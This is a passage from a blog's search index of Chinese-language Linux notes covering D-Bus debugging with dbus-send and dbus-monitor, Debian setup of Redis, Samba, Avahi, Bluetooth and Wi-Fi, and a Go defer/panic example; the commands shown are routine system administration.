信号会被广播，感兴趣的对象可以处理这个 信号，同时信号中也可以带有相关的数据。 在 D-BUS 中有四种类型的消息：方法调用（method call）、方法返回（method return）、信号（signal）和错误（error）。\n要执行D-BUS对象的方法，您需要向对象发送一个方法调用消息。 它将完成一些处理（就是执行了对象中的Method，Method是可以带有输入参数的。）并返回，返回消息或者错误消息。 信号的不同之处在于它们不返回任何内容：既没有“信号返回”消息，也没有任何类型的错误消息。\n4. D-Bus 1. D-Feet D-Feet是一个易于使用D-bus调试器，D-Feet用来检查D-bus接口的运行程序和调用接口的方法。可以显示service提供的所有对象、信号和方法，还可以通过它实现方法调用。\n在有桌面环境的系统上安装 D-Feet，这里自己选择的是Ubuntu：\n1 2 3 4 5 6 7 # 安装依赖 sudo apt-get install dbus sudo apt-get install libgtk2.0-dev sudo apt-get install libdbus-glib-1-dev # 安装 D-Feet sudo apt-get install d-feet 同时下载一个简单的 DBus 程序：下载链接，运行方法：\n1 2 3 4 5 6 7 8 9 10 11 12 # 解压 tar -zxvf hello-dbus3-0.1.tar.gz # 编译 cd hello-dbus3-0.1/ ./autogen.sh ./configure make # 运行 cd src ./example-service 运行 d-feet，打开 Session bus，找到一个叫 “org.fmddlmyy.Test” 连接名，这个链接就是我们刚刚运行的一个D-Bus程序： 在右侧展开栏我们会发现 org.fmddlmyy.Test.Basic 下有一个 Add 方法，我们点击它，输入 1，2，点击执行，可以看到给我们返回了结果：\n通过上面的操作我们通过 d-feet 发起了一次 d-bus 请求。\n2. dbus-send 和 dbus-monitor dbus提供了两个小工具：dbus-send和dbus-monitor。我们可以用dbus-send发送消息。用dbus-monitor监视总线上流动的消息。 让我们通过dbus-send发送消息来调用前面的Add方法，这时dbus-send充当了应用程序B。用dbus-monitor观察调用过程中的消息。\n开启两个终端，一个终端运行 dbus-monitor，一个终端使用 dbus-send 发送消息：\n1 dbus-send --session --type=method_call --print-reply --dest=org.fmddlmyy.Test /TestObj org.fmddlmyy.Test.Basic.Add int32:100 int32:999 在 dbus-monitor 中可以发现如下输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # 向 D-Bus Damon 发送Hello建立连接 method call time=1634008917.432651 sender=:1.123 -\u0026gt; destination=org.freedesktop.DBus serial=1 path=/org/freedesktop/DBus; interface=org.freedesktop.DBus; member=Hello method return time=1634008917.432668 sender=org.freedesktop.DBus -\u0026gt; destination=:1.123 serial=1 reply_serial=1 string \u0026#34;:1.123\u0026#34; # 广播全局，指定名称的拥有者发生了变化 signal time=1634008917.432674 sender=org.freedesktop.DBus -\u0026gt; destination=(null destination) serial=9 path=/org/freedesktop/DBus; interface=org.freedesktop.DBus; member=NameOwnerChanged string \u0026#34;:1.123\u0026#34; # 名字 string \u0026#34;\u0026#34;\t# 拥有者原始名字 string \u0026#34;:1.123\u0026#34; # 拥有者现在名字 # 通知应用获得了指定名称的拥有权 signal time=1634008917.432681 sender=org.freedesktop.DBus -\u0026gt; destination=:1.123 serial=2 path=/org/freedesktop/DBus; interface=org.freedesktop.DBus; member=NameAcquired string \u0026#34;:1.123\u0026#34; # 调用 Add 方法 method call time=1634008917.433334 sender=:1.123 -\u0026gt; destination=org.fmddlmyy.Test serial=2 path=/TestObj; interface=org.fmddlmyy.Test.Basic; member=Add int32 100 int32 999 # Add 方法返回结果 method return time=1634008917.434117 sender=:1.121 -\u0026gt; destination=:1.123 serial=6 reply_serial=2 int32 1099 # 通知应用失去了指定名称的拥有权 signal time=1634008917.435946 sender=org.freedesktop.DBus -\u0026gt; destination=:1.123 serial=5 path=/org/freedesktop/DBus; interface=org.freedesktop.DBus; member=NameLost string \u0026#34;:1.123\u0026#34;2 # 广播全局，指定名称的拥有者发生了变化 signal time=1634008917.435978 sender=org.freedesktop.DBus -\u0026gt; destination=(null destination) serial=10 path=/org/freedesktop/DBus; interface=org.freedesktop.DBus; member=NameOwnerChanged string \u0026#34;:1.123\u0026#34; string \u0026#34;:1.123\u0026#34; string \u0026#34;\u0026#34; 通过观察 dbus-monitor 我们了解了一次完整的 d-bus 通信的流程。\n3. org.freedesktop.DBus 在上面的流程中出现的 org.freedesktop.DBus 就是 Bus Damon ，我们可以使用 org.freedesktop.DBus.Introspectable.Introspect 方法查看一个 Bus 对象支持的接口，这里我们使用它来查看 org.freedesktop.DBus 支持的接口：\n1 dbus-send --session --type=method_call --print-reply --dest=org.freedesktop.DBus / org.freedesktop.DBus.Introspectable.Introspect 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 \u0026#34;http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd\u0026#34;\u0026gt; \u0026lt;node\u0026gt; \u0026lt;interface name=\u0026#34;org.freedesktop.DBus\u0026#34;\u0026gt; \u0026lt;method name=\u0026#34;Hello\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;RequestName\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;u\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;u\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;ReleaseName\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;u\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;StartServiceByName\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;u\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;u\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;UpdateActivationEnvironment\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;a{ss}\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;NameHasOwner\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;b\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;ListNames\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;as\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;ListActivatableNames\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;as\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;AddMatch\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;RemoveMatch\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;GetNameOwner\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;ListQueuedOwners\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;as\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;GetConnectionUnixUser\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;u\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;GetConnectionUnixProcessID\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;u\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;GetAdtAuditSessionData\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;ay\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;GetConnectionSELinuxSecurityContext\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;ay\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;GetConnectionAppArmorSecurityContext\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;ReloadConfig\u0026#34;\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;GetId\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;GetConnectionCredentials\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;in\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;a{sv}\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;property name=\u0026#34;Features\u0026#34; type=\u0026#34;as\u0026#34; access=\u0026#34;read\u0026#34;\u0026gt; \u0026lt;annotation name=\u0026#34;org.freedesktop.DBus.Property.EmitsChangedSignal\u0026#34; value=\u0026#34;const\u0026#34;/\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;Interfaces\u0026#34; type=\u0026#34;as\u0026#34; access=\u0026#34;read\u0026#34;\u0026gt; \u0026lt;annotation name=\u0026#34;org.freedesktop.DBus.Property.EmitsChangedSignal\u0026#34; value=\u0026#34;const\u0026#34;/\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;signal name=\u0026#34;NameOwnerChanged\u0026#34;\u0026gt; \u0026lt;arg type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;arg type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/signal\u0026gt; \u0026lt;signal name=\u0026#34;NameLost\u0026#34;\u0026gt; \u0026lt;arg type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/signal\u0026gt; \u0026lt;signal name=\u0026#34;NameAcquired\u0026#34;\u0026gt; \u0026lt;arg type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/signal\u0026gt; \u0026lt;/interface\u0026gt; \u0026lt;interface name=\u0026#34;org.freedesktop.DBus.Introspectable\u0026#34;\u0026gt; \u0026lt;method name=\u0026#34;Introspect\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;/interface\u0026gt; \u0026lt;interface name=\u0026#34;org.freedesktop.DBus.Peer\u0026#34;\u0026gt; \u0026lt;method name=\u0026#34;GetMachineId\u0026#34;\u0026gt; \u0026lt;arg direction=\u0026#34;out\u0026#34; type=\u0026#34;s\u0026#34;/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;method name=\u0026#34;Ping\u0026#34;\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;/interface\u0026gt; \u0026lt;node name=\u0026#34;org/freedesktop/DBus\u0026#34;/\u0026gt; \u0026lt;/node\u0026gt; \u0026#34; 从输出可以看到会话总线对象支持标准接口“org.freedesktop.DBus.Introspectable”和接口“org.freedesktop.DBus”。 接口“org.freedesktop.DBus”有16个方法和3个信号。下表列出了“org.freedesktop.DBus”的12个方法的简要说明：\n方法 用途 org.freedesktop.DBus.RequestName (in STRING name, in UINT32 flags, out UINT32 reply) 请求公众名。其中flag定义如下： - DBUS_NAME_FLAG_ALLOW_REPLACEMENT 1 - DBUS_NAME_FLAG_REPLACE_EXISTING 2 - DBUS_NAME_FLAG_DO_NOT_QUEUE 4 返回值reply定义如下：\n- DBUS_REQUEST_NAME_REPLY_PRIMARY_OWNER 1 - DBUS_REQUEST_NAME_REPLY_IN_QUEUE 2 - DBUS_REQUEST_NAME_REPLY_EXISTS 3 - DBUS_REQUEST_NAME_REPLY_ALREADY_OWNER 4 org.freedesktop.DBus.ReleaseName (in STRING name, out UINT32 reply) 释放公众名。返回值reply定义如下： DBUS_RELEASE_NAME_REPLY_RELEASED 1 DBUS_RELEASE_NAME_REPLY_NON_EXISTENT 2 DBUS_RELEASE_NAME_REPLY_NOT_OWNER 3 org.freedesktop.DBus.Hello (out STRING unique_name) 一个应用在通过消息总线向其它应用发消息前必须先调用Hello 获取自己这个连接的唯一名。返回值就是连接的唯一名。dbus没有定义专门的切断连接命令，关闭socket就是切断连接。 org.freedesktop.DBus.ListNames (out ARRAY of STRING bus_names) 返回消息总线上已连接的所有连接名，包括所有公共名和唯一名。例如连接 “org.fmddlmyy.Test” 同时有公共名 “org.fmddlmyy.Test” 和唯一名 “:1.123” ， 这两个名称都会被返回。 org.freedesktop.DBus.ListActivatableNames (out ARRAY of STRING bus_names) 返回所有可以启动的服务名。dbus支持按需启动服务，即根据应用程序的请求启动服务。 org.freedesktop.DBus.NameHasOwner (in STRING name, out BOOLEAN has_owner) 检查是否有连接拥有指定名称。 org.freedesktop.DBus.StartServiceByName (in STRING name, in UINT32 flags, out UINT32 ret_val) 按名称启动服务。参数flags暂未使用。返回值ret_val定义如下： 1 服务被成功启动 2 已经有连接拥有要启动的服务名 org.freedesktop.DBus.GetNameOwner (in STRING name, out STRING unique_connection_name) 返回拥有指定公众名的连接的唯一名。 org.freedesktop.DBus.GetConnectionUnixUser (in STRING connection_name, out UINT32 unix_user_id) 返回指定连接对应的服务器进程的Unix用户id。 org.freedesktop.DBus.AddMatch (in STRING rule) 为当前连接增加匹配规则。 org.freedesktop.DBus.RemoveMatch (in STRING rule) 为当前连接去掉指定匹配规则。 org.freedesktop.DBus.GetId (out STRING id) 返回消息总线的ID。这个ID在消息总线的生命期内是唯一的。 接口 “org.freedesktop.DBus” 的3个信号是：\n信号 用途 org.freedesktop.DBus.NameOwnerChanged (STRING name, STRING old_owner, STRING new_owner) 指定名称的拥有者发生了变化。 org.freedesktop.DBus.NameLost (STRING name) 通知应用失去了指定名称的拥有权。 org.freedesktop.DBus.NameAcquired (STRING name) 通知应用获得了指定名称的拥有权。 4. D-Bus Service org.freedesktop.DBus.ListActivatableNames 接口可以返回所有可以启动的服务名：\n1 dbus-send --session --type=method_call --print-reply --dest=org.freedesktop.DBus / org.freedesktop.DBus.ListActivatableNames|sort 1 2 3 4 5 6 7 8 string \u0026#34;ca.desrt.dconf\u0026#34; string \u0026#34;com.feralinteractive.GameMode\u0026#34; string \u0026#34;io.snapcraft.Launcher\u0026#34; string \u0026#34;io.snapcraft.Settings\u0026#34; string \u0026#34;org.a11y.Bus\u0026#34; string \u0026#34;org.bluez.obex\u0026#34; string \u0026#34;org.fedoraproject.Config.Printing\u0026#34; ...... 我们再使用下面的命令：\n1 cat /usr/share/dbus-1/services/* | grep Name= | sort 1 2 3 4 5 6 7 8 Name=ca.desrt.dconf Name=com.feralinteractive.GameMode Name=io.snapcraft.Launcher Name=io.snapcraft.Settings Name=org.a11y.Bus Name=org.bluez.obex Name=org.fedoraproject.Config.Printing ...... 我们会发现上诉两个命令的输出内容是基本一致的（可能有些干扰数据），第二个命令实际上就是查看的 /usr/share/dbus-1/services/ 文件夹下的内容，进入该文件夹下，我们会发现很多 service 文件，我们也可以添加自己 service 文件，将 org.fmddlmyy.Test 加入服务：\n1 2 3 4 5 cat org.fmddlmyy.Test.service [D-BUS Service] Name=org.fmddlmyy.Test Exec=/root/hello-dbus3-0.1/src/example-service 这时我们不去手动启动 example-service 文件，直接请求：\n1 dbus-send --session --type=method_call --print-reply --dest=org.fmddlmyy.Test /TestObj org.fmddlmyy.Test.Basic.Add int32:100 int32:999 发现现在已经成功访问了该服务！\n刚刚我们看的是 seesion bus 的 service，system bus 的 service 在 /usr/share/dbus-1/system-services 路径下，有兴趣的小伙伴可以去看看。\n参考链接：\n我的随笔 (fmddlmyy.cn) DBus学习笔记 - 莫水千流 - 博客园 (cnblogs.com) 4.1. D-Bus系列之入门 — big-doc 0.1 documentation (thebigdoc.readthedocs.io) D-Bus Tutorial (dbus.freedesktop.org) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/d-bus-%E5%AD%A6%E4%B9%A0/","title":"D-Bus 学习"},{"content":"DBUS 测试命令 1 2 3 4 5 # 修改时区为 Asia/Shanghai dbus-send --system --type=method_call --print-reply --dest=org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1.SetTimezone string:Asia/Shanghai boolean:true # 修改时区为 U dbus-send --system --type=method_call --print-reply --dest=org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1.SetTimezone string:UTC boolean:true ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/dbus-%E6%B5%8B%E8%AF%95%E5%91%BD%E4%BB%A4/","title":"dbus 测试命令"},{"content":"D-Bus 数值类型 标识 介绍 a ARRAY 数组 b BOOLEAN 布尔值 d DOUBLE IEEE 754双精度浮点数 g SIGNATURE 类型签名 i INT32 32位有符号整数 n INT16 16位有符号整数 o OBJECT_PATH 对象路径 q UINT16 16位无符号整数 s STRING 零结尾的UTF-8字符串 t UINT64 64位无符号整数 u UINT32 32位无符号整数 v VARIANT 可以放任意数据类型的容器，数据中包含类型信息。例如glib中的GValue。 x INT64 64位有符号整数 y BYTE 8位无符号整数 () 定义结构时使用。例如\u0026quot;(i(ii))\u0026quot; {} 定义键－值对时使用。例如\u0026quot;a{us}\u0026quot; ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/dbus-%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B/","title":"dbus 数值类型"},{"content":"Debian 安装 Redis 安装依赖项：\n1 apt-get install wget curl gnupg -y 添加 GPG 密钥：\n1 curl https://packages.redis.io/gpg | apt-key add - 添加 Redis 官方存储库：\n1 echo \u0026#34;deb https://packages.redis.io/deb $(lsb_release -cs) main\u0026#34; | tee /etc/apt/sources.list.d/redis.list 更新存储库和安装 Redis：\n1 2 apt-get update -y apt-get install redis-server -y 验证 Redis 安装：\n1 apt-cache policy redis-server 运行 Redis 服务：\n1 systemctl enable redis-server --now 查看 Redis 服务运行状态：\n1 systemctl status redis-server 连接 Redis：\n1 redis-cli 更改 Redis 服务配置：\n1 vim /etc/redis/redis.conf ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/debian-%E5%AE%89%E8%A3%85-redis/","title":"Debian 安装 redis"},{"content":"Debian 编译安装 qBittorent 1 2 3 4 5 6 7 8 9 # 下载 wget https://github.com/qbittorrent/qBittorrent/archive/refs/tags/release-4.5.0.tar.gz # 解压 tar xf release-4.5.0.tar.gz cd release-4.5.0 # 编译配置 ./configure --disable-debug --enable-encryption --with-libgeoip=system CXXFLAGS=-std=c++14 缺失依赖：\nQ: configure: error: Could not find pkg-config A: apt install pkg-config Q: configure: error: Could not find qmake ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/debian-%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85-qbittorent/","title":"Debian 编译安装 qBittorent"},{"content":"Debian 配置 Avahi 1 2 3 4 5 6 7 8 9 10 11 # 安装 守护进程 apt install avahi-daemon # 安装工具 apt install avahi-utils # 启动 avahi systemctl start avahi-daemon # 查看服务状态 systemctl status avahi-daemon avahi 提供的服务配置示例：\n1 2 3 ls /usr/share/doc/avahi-daemon/examples/ example.service sftp-ssh.service ssh.service 发布 ssh 服务：\n1 2 3 4 5 6 7 8 9 10 11 # 拷贝服务配置 cp /usr/share/doc/avahi-daemon/examples/ssh.service /etc/avahi/services/ # 修改对外暴露的主机名，默认采用的主机名，当局域网内有相同主机名时可能产生冲突 vim /etc/avahi/avahi-daemon.conf [server] host-name=avahi # 重启 avahi systemctl restart avahi-daemon 测试 mDNS 服务：\nping avahi.local ssh root@avahi.local 测试 samba 服务：\n1 # 安装 samba ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/debian-%E9%85%8D%E7%BD%AE-avahi/","title":"Debian 配置 Avahi "},{"content":"安装配置 samba 安装 samba 服务：\n1 apt install samba, smbclient(smb客户端，用于连接smb) 创建共享文件夹 :\n1 2 mkdir /samba chmod 777 /samba 配置 samba：\n1 2 3 4 5 6 7 8 9 vim /etc/samba/smb.conf # 在配置文件末尾追加 [share] comment = share path = /samba browsable = yes guest ok = yes # 配置访客访问 启动 samba 服务：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 systemctl start smbd # 启动 smbd systemctl enable smbd # 加入开机自启动 systemctl status smbd # 查看服务状态 ● smbd.service - Samba SMB Daemon Loaded: loaded (/lib/systemd/system/smbd.service; enabled; vendor preset: enabled) Active: active (running) since Tue 2022-12-13 11:18:32 CST; 4min 54s ago Docs: man:smbd(8) man:samba(7) man:smb.conf(5) Process: 12185 ExecStartPre=/usr/share/samba/update-apparmor-samba-profile (code=exited, status=0/SUCCESS) Main PID: 12194 (smbd) Status: \u0026#34;smbd: ready to serve connections...\u0026#34; Tasks: 5 (limit: 18857) Memory: 7.8M CPU: 469ms CGroup: /system.slice/smbd.service ├─12194 /usr/sbin/smbd --foreground --no-process-group ├─12196 /usr/sbin/smbd --foreground --no-process-group ├─12197 /usr/sbin/smbd --foreground --no-process-group ├─12199 /usr/sbin/smbd --foreground --no-process-group └─12201 /usr/sbin/smbd --foreground --no-process-group Dec 13 11:18:32 debian11 systemd[1]: Starting Samba SMB Daemon... Dec 13 11:18:32 debian11 systemd[1]: Started Samba SMB Daemon. 本地连接 samba:\n1 2 3 4 5 6 7 # 首先需要添加系统用户 useradd -G samba debian11 echo \u0026#39;Password\u0026#39; |passwd --stdin debian11 # 添加 samba 用户 smbpasswd -a debian11 # 连接samba smbclient -L 127.0.0.1 -U debian11 配置苹果和Windows的网络发现 1 2 3 4 5 6 # 安装 avahi，avahi是zeroconfig协议的一个实现，苹果的bonjour是zeroconfig的另外一个实现 # 安装了 avahi 后，苹果设备就能发现 linux 上的 samba 服务 apt install avahi-daemon # wsdd 实现了 WS-Discover 协议，Windows 可以通过此协议发现网络设备 apt install wsdd\t启动服务：\n1 2 3 4 # 不需要在avahi的services中配置smb服务，因为smb默认会借助avahi进行服务暴露 systemctl start avahi-daemon systemctl start wsdd ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/debian-%E9%85%8D%E7%BD%AE-samba/","title":"Debian 配置 samba"},{"content":"Debian 使用蓝牙 安装配置蓝牙服务 1. bluetooth 服务 1 2 apt install bluetooth systemctl start bluetooth 2. 电源管理 rfkill list rfkill unblock all 3. firmware-iwlwifi 1 apt update \u0026amp;\u0026amp; apt install firmware-iwlwifi 4. bluetooth 配置 vim /etc/dbus-1/system.d/bluetooth.conf add to config: \u0026lt;policy group=\u0026#34;bluetooth\u0026#34;\u0026gt; \u0026lt;allow send_destination=\u0026#34;org.bluez\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; usermod -a -G bluetooth root reboot 使用蓝牙服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 启动蓝牙网卡 hciconfig hci0 up # 扫描 bluetoothctl scan on # 配对 bluetoothctl pair {addr} # 信任设备 bluetoothctl trust {addr} # 连接设备 bluetoothctl connect {addr} # 安装 pulseaudio 用以连接蓝牙音箱设备 apt install pulseaudio-module-bluetooth pulseaudio --start -D pactl load-module module-bluetooth-discover 安装 pybluez 库包 apt-get install python3-dev apt-get install libbluetooth-dev pip install git+https://github.com/pybluez/pybluez.git#egg=pybluez # 设备服务查看命令 sdptool windows 蓝牙抓包 # 命令行管理员执行 # 开始抓包 logman create trace \u0026#34;bth_hci\u0026#34; -ow -o C:\\bth_hci.etl -p {8a1f9517-3a8c-4a9e-a018-4f17a200f277} 0xffffffffffffffff 0xff -nb 16 16 -bs 1024 -mode Circular -f bincirc -max 4096 -ets # 结束抓包 logman stop \u0026#34;bth_hci\u0026#34; -ets # 下载转换工具 https://download.microsoft.com/download/e/e/e/eeed3cd5-bdbd-47db-9b8e-ca9d2df2cd29/BluetoothTestPlatformPack-1.8.0.msi # 下载后BTETLParse.exe目录 C:\\BTP\\v1.8.0\\x64 # 转换 BTETLParse.exe bth_hci_phone.etl hciconfig 使用问题 # hciconfig hci0 up Can\u0026#39;t init device hci0: No such file or directory (2) 查看系统日志发现有如下报错：\n1 2 hci0: firmware: failed to load intel/ibt-0040-2120.sfi (-2) hci0: firmware: failed to load intel/ibt-0040-2120.ddc (-2) 这是由于没有加载对应的固件包导致，解决方案：\n1 2 3 4 5 6 7 8 9 10 # apt安装固件包 apt update \u0026amp;\u0026amp; apt install firmware-iwlwifi # 如果安装了固件包依然存在这种问题，去查看一下对应的固件包是否已经安装 cd /usr/lib/firmware\t# 在这个文件夹下查看是否有对应的固件包 # 如果没有对应的固件包，则可能是由于固件比较新没有包含在 firmware-iwlwifi 中 # 去 https://anduin.linuxfromscratch.org/sources/linux-firmware/ 下载所需的固件包，放到对应的路径下 # 更新所有已安装内核的 initramfs update-initramfs -kall -u bluetoothctl 使用问题 1 2 # bluetoothctl scan on No default controller available ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/debian-%E4%BD%BF%E7%94%A8%E8%93%9D%E7%89%99/","title":"Debian 使用蓝牙"},{"content":"Debian 使用无线网卡 依赖安装 1 2 3 4 5 # wpa_supplicant 和 wpa_cli apt install wpasupplicant # iwconfig apt install iw 服务启动 1 2 3 4 5 6 7 8 9 10 11 # 启动无线网卡 iwconfig wlo1 power on # 写入配置文件 vim /etc/wpa_supplicant.conf ctrl_interface=/var/run/wpa_supplicant update_config=1 # 启动守护进程 wpa_supplicant -Dnl80211 -iwlo1 -c/etc/wpa_supplicant.conf -B 扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # wpa_cli -i wlo1 wpa_cli v2.9 Copyright (c) 2004-2019, Jouni Malinen \u0026lt;j@w1.fi\u0026gt; and contributors This software may be distributed under the terms of the BSD license. See README for more details. Interactive mode \u0026gt; scan OK \u0026lt;3\u0026gt;CTRL-EVENT-SCAN-STARTED \u0026gt; scan_results bssid / frequency / signal level / flags / ssid bc:22:47:a1:dd:c0 5220 -89 [WPA-PSK-CCMP+TKIP][WPA2-PSK-CCMP+TKIP][ESS] example 连接 wifi （通过配置文件） 1 2 3 4 5 6 7 8 9 vim /etc/wpa_supplicant/wpa_supplicant-wlo1.conf network={ ssid=\u0026#34;{ssid}\u0026#34; key_mgmt=WPA-PSK WPA-PSK-SHA256 psk=\u0026#34;{password}\u0026#34; } systemctl restart wpa_supplicant@wlo1.service ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/debian-%E4%BD%BF%E7%94%A8%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/","title":"Debian 使用无线网卡"},{"content":"defer 与 panic 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package main import ( \u0026#34;fmt\u0026#34; ) func main() { defer_call() } func defer_call() { defer fmt.Println(\u0026#34;defer 1\u0026#34;) defer fmt.Println(\u0026#34;defer 2\u0026#34;) fmt.Println(\u0026#34;hello world\u0026#34;) panic(\u0026#34;panic\u0026#34;) } // hello world // defer 2 // defer 1 // panic: panic // // goroutine 1 [running]: // main.defer_call() defer 会在 return 之前按照先入后出的顺序执行，但是当遇到 panic 时，会等所有 defer 执行完毕再执行 panic 。\n结合 recover 就很清晰了，这种顺序差异主要是执行寻找带有 recover 的 defer：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package main import ( \u0026#34;fmt\u0026#34; ) func main() { defer_call() } func defer_call() { defer fmt.Println(\u0026#34;defer 1\u0026#34;) defer fmt.Println(\u0026#34;defer 